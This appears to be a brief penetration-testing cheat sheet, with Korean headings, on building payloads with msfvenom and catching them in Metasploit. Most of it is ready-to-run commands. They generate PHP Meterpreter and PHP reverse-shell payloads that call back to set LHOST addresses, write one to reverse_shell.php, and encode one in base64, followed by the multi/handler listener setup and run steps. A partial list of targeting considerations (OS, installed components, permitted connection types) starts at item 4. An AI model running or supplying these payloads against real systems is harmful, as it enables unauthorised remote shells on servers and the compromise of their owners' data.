# msfvenom -> payload builder in memory

msfvenom --list formats
msfvenom --list payload | grep meterpreter

# 사용 시 주의

4. The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
5. Components available on the target system (Is Python installed? Is this a PHP website? etc.)
6. Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)

# -p : payload file

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

# setting lhost, lport (local)

msf6 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
msf6 exploit(multi/handler) > show options

# exploit run

exploit
run
